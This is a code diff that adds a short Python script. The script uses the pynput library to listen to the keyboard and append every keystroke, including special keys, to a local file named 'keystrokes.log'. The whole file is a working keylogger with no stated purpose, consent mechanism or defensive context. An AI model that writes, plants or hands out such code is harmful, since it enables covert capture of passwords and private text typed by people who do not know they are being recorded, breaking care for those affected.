@@ -1,0 +1,15 @@
+from pynput.keyboard import Listener
+
+# Path to the log file where keystrokes will be saved
+log_file = "keystrokes.log"
+
+def on_press(key):
+    # Open the log file in append mode and write the pressed key
+    with open(log_file, "a") as f:
+        try:
+            f.write(str(key.char))
+        except AttributeError:
+            f.write(f"[{key}]")
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
